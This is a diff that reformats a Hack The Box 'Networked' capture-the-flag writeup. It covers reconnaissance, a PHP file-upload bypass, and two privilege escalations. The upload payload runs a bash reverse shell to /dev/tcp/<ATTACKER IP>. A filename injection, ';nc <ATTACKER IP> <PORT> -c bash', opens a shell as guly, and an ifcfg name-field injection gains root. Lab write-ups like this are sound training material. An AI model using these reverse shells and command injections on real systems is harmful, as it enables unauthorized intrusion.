@@ -1,7 +1,8 @@
-----
-#mimebypass #ifcfg
+# HTB Networked Writeup
 
-#### Reconnaissance
+<code>#mimebypass</code> <code>#ifcfg</code>
+
+## Reconnaissance
 
 `nmap -sC -sV -p- 10.10.10.146`
 
@@ -24,31 +25,31 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 152.26 seconds
 ```
 
-#### Enumeration
+## Enumeration
 
-##### Port 80 - HTTP
+### Port 80 - HTTP
 
 - Port 80 is hosting a static webpage with the following text:
 
-![[Screenshot 2023-06-12 at 9.27.08 PM.png|400]]
+<img src="https://github.com/Kr1tz3x3/HTB-Writeups/blob/main/assets/Screenshot 2023-06-12 at 9.27.08 PM.png" width=50% height=50%>
 
 - Enumerating possible files/directories against the parent directory gives the following:
 
 `ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-directories.txt -u http://10.10.10.146/FUZZ  `
 
-![[Screenshot 2023-06-12 at 11.33.59 PM.png|600]]
+<img src="https://github.com/Kr1tz3x3/HTB-Writeups/blob/main/assets/Screenshot 2023-06-12 at 11.33.59 PM.png" width=50% height=50%>
 
 - Navigating to these directories gives us a page with file upload capabilities and a tar archive names `backup.tar`
 
-![[Screenshot 2023-06-12 at 11.39.19 PM.png|400]]
+<img src="https://github.com/Kr1tz3x3/HTB-Writeups/blob/main/assets/Screenshot 2023-06-12 at 11.39.19 PM.png" width=50% height=50%>
 
-![[Screenshot 2023-06-12 at 11.38.52 PM.png|400]]
+<img src="https://github.com/Kr1tz3x3/HTB-Writeups/blob/main/assets/Screenshot 2023-06-12 at 11.38.52 PM.png" width=50% height=50%>
 
 - Extracting the archive provides `php` files that are hosted on the web server:
 
-![[Screenshot 2023-06-12 at 11.40.36 PM.png|400]]
+<img src="https://github.com/Kr1tz3x3/HTB-Writeups/blob/main/assets/Screenshot 2023-06-12 at 11.40.36 PM.png" width=50% height=50%>
 
-#### Exploitation
+## Exploitation
 
 - Looking within the source code files, there are three file upload validation methods being used:
 
@@ -66,13 +67,13 @@ exec("/bin/bash -c 'bash -i >& /dev/tcp/<ATTACKER IP>/<PORT> 0>&1'");
 
 - Uploading the file gives us the following response:
 
-![[Screenshot 2023-07-12 at 10.07.52 AM.png|600]]
+<img src="https://github.com/Kr1tz3x3/HTB-Writeups/blob/main/assets/Screenshot 2023-07-12 at 10.07.52 AM.png" width=50% height=50%>
 
 - Opening a netcat listener to the specified port and navigating to the photo gallery gives us a shell as the `apache` user:
 
-![[Screenshot 2023-07-12 at 10.54.14 AM.png|400]]
+<img src="https://github.com/Kr1tz3x3/HTB-Writeups/blob/main/assets/Screenshot 2023-07-12 at 10.54.14 AM.png" width=50% height=50%>
 
-#### Privilege Escalation to `guly`
+## Privilege Escalation to `guly`
 
 - Two interesting files that the user, `apache`, has read access to in `guly` home directory are `check_attack.php` and `crontab.guly`. 
 
@@ -122,17 +123,17 @@ foreach ($files as $key => $value) {
 - The method a file is removed using the `exec` function includes the `$value` variable, which is the filename(s) included in the `uploads` directory. This can be used to inject and run a command by including a semicolon in the front of the filename to obtain a shell as `guly`:
 	`touch ;nc <ATTACKER IP> <PORT> -c bash`
 
-![[Screenshot 2023-07-12 at 2.50.21 PM.png|500]]
+<img src="https://github.com/Kr1tz3x3/HTB-Writeups/blob/main/assets/Screenshot 2023-07-12 at 2.50.21 PM.png" width=50% height=50%>
 
-#### Privilege Escalation to `root`
+## Privilege Escalation to `root`
 
 - The `guly` user can run sudo with the following commands:
 
-![[Screenshot 2023-07-12 at 2.56.40 PM.png|500]]
+<img src="https://github.com/Kr1tz3x3/HTB-Writeups/blob/main/assets/Screenshot 2023-07-12 at 2.56.40 PM.png" width=50% height=50%>
 
 - The `changename.sh` script outputs a script from `network-scripts` that has a privilege escalation vulnerability
 	- [Vulmon Exploit](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
 
 - Following the documented vulnerability, we are able to escalate our privileges by adding a space and a command to be executed after the value for the `interface NAME` field of the script.
 
-![[Screenshot 2023-07-12 at 3.27.38 PM.png|400]]
+<img src="https://github.com/Kr1tz3x3/HTB-Writeups/blob/main/assets/Screenshot 2023-07-12 at 3.27.38 PM.png" width=50% height=50%>
